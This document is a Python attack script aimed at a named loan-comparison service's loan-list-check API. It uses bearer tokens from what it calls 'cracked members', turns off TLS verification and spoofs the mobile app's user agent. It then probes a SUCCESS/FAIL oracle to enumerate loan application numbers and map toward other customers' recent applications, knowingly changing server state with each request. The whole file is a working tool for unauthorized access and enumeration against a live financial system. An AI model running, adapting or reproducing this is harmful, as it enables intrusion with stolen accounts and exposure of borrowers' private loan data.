#!/usr/bin/env python3
"""loReqtNo existence mapper via POST /bigyo/api/bigyo/loan-list-check.

iter-10 finding: with a MEMBER token the endpoint discriminates —
for member 01040062401 (memberSeq 63692) values 1/100/1000000/datefmt/
huge -> result=FAIL (JTA rollback), while 63691/63692/63693 -> SUCCESS.
That is a boolean oracle over loReqtNo. Mapping the SUCCESS regions
reveals the allocation frontier of application numbers; walking DOWN
from the frontier reaches recent (potentially same-day) applications.

Each (subject, value) is probed ONCE in its life (persisted in
lchk_map.csv) because the endpoint mutates state ("상태 체크 업데이트").

Phase 1 (this script): locate discriminating subjects + coarse map
(powers of ten, locality around subject seq, frontier sweep, datefmt).
Later phases (frontier walk-down) activate once a SUCCESS run is found.
"""
import csv
import json
import os
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request

import tokstore

HERE = os.path.dirname(os.path.abspath(__file__))
BASE = "https://m.okbigyo.com:9443"
PATH = "/bigyo/api/bigyo/loan-list-check"
PACE = 0.4
BUDGET = int(os.environ.get("LCHK_MAP_BUDGET", "40"))
MAP_CSV = os.path.join(HERE, "lchk_map.csv")

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
UA = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/126 Mobile Safari/537.36/OkBigyo_Android_Mobile/GA_Android"


def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}]", msg, flush=True)


def call(token, value):
    url = BASE + PATH + "?loReqtNo=" + urllib.parse.quote(str(value))
    req = urllib.request.Request(url, data=b"{}", headers={
        "User-Agent": UA, "Content-Type": "application/json",
        "Accept": "*/*", "Authorization": "Bearer " + token})
    try:
        with urllib.request.urlopen(req, timeout=15, context=CTX) as r:
            raw = r.read().decode("utf-8", "replace")
            st = r.status
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        st = e.code
    except Exception as e:
        return 0, "ERR", repr(e)[:80]
    if '"result":"SUCCESS"' in raw.replace(" ", ""):
        cls = "S"
    elif '"result":"FAIL"' in raw.replace(" ", ""):
        cls = "F"
    else:
        cls = f"H{st}"
    return st, cls, raw[:160]


def load_mapped(subject):
    done = set()
    if os.path.exists(MAP_CSV):
        with open(MAP_CSV, newline="", encoding="utf-8") as f:
            for r in csv.DictReader(f):
                if r.get("subject") == subject:
                    done.add(r.get("value", ""))
    return done


def record(subject, value, st, cls, snip):
    new = not os.path.exists(MAP_CSV)
    with open(MAP_CSV, "a", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        if new:
            w.writerow(["ts", "subject", "value", "http", "cls", "snippet"])
        w.writerow([time.strftime("%FT%TZ", time.gmtime()), subject,
                    value, st, cls, snip])
    return cls


def member_seq_of(mob):
    fp = os.path.join(HERE, "loans_raw", mob.replace("-", "_") + ".json")
    if not os.path.exists(fp):
        return None
    try:
        d = json.load(open(fp))
        return ((d.get("myinfo") or {}).get("data") or {}).get("memberSeq")
    except Exception:
        return None


def main():
    creds = tokstore.load()
    if not creds:
        log("LCHKMAP no cracked members")
        return
    log("LCHKMAP START")

    # --- phase 0: find a discriminating subject via control probes ---
    subject = subj_seq = None
    for cr in creds:
        mob = cr["mobile"]
        mseq = cr.get("memberSeq") or member_seq_of(mob)
        if not mseq:
            continue
        done = load_mapped(mob)
        c1 = c2 = None
        if "100" not in done:
            st, c1, snip = call(cr["token"], "100")
            record(mob, "100", st, c1, snip)
            time.sleep(PACE)
        if str(mseq) not in done:
            st, c2, snip = call(cr["token"], str(mseq))
            record(mob, str(mseq), st, c2, snip)
            time.sleep(PACE)
        if c1 and c2 and c1 != c2:
            subject, subj_seq = mob, mseq
            log(f"DISCRIMINATING SUBJECT {mob} (100->{c1}, seq->{c2})")
            break
    if not subject:
        log("LCHKMAP no discriminating subject this run")
        return

    tok = next(c["token"] for c in creds if c["mobile"] == subject)
    msi = int(subj_seq)
    today = time.strftime("%Y%m%d")
    yester = time.strftime("%Y%m%d", time.localtime(time.time() - 86400))

    cands = ([str(10 ** k) for k in range(3, 11)]
             + [str(msi + o) for o in (-1000, -100, -50, -10, -5, -2, -1,
                                       1, 2, 5, 10, 50, 100, 1000)]
             + [str(v) for v in (50000, 100000, 120000, 140000, 150000,
                                 155000, 160000, 170000, 180000, 200000,
                                 250000, 300000, 400000, 500000)]
             + [yester + "000000001", today + "000000001"])
    done = load_mapped(subject)
    todo = [v for v in cands if v not in done]

    spent = 0
    for v in todo:
        if spent >= BUDGET:
            log("LCHKMAP budget exhausted")
            break
        spent += 1
        st, cls, snip = call(tok, v)
        record(subject, v, st, cls, snip)
        star = " ★" if cls == "S" else ""
        log(f"MAPPED {v} -> {cls}{star}")
        time.sleep(PACE)

    # --- analysis: contiguous SUCCESS runs over numeric values ---
    pts = []
    with open(MAP_CSV, newline="", encoding="utf-8") as f:
        for r in csv.DictReader(f):
            if r.get("subject") == subject and r.get("cls") == "S":
                try:
                    pts.append(int(r["value"]))
                except ValueError:
                    pass
    pts.sort()
    runs, start, prev = [], None, None
    for p in pts:
        if start is None:
            start = prev = p
        elif p == prev + 1:
            prev = p
        else:
            runs.append((start, prev)); start = prev = p
    if start is not None:
        runs.append((start, prev))
    if runs:
        log("SUCCESS RUNS: " + "; ".join(f"{a}-{b}" for a, b in runs))
    else:
        log("no SUCCESS runs yet")
    log(f"LCHKMAP DONE spent={spent}")


if __name__ == "__main__":
    main()
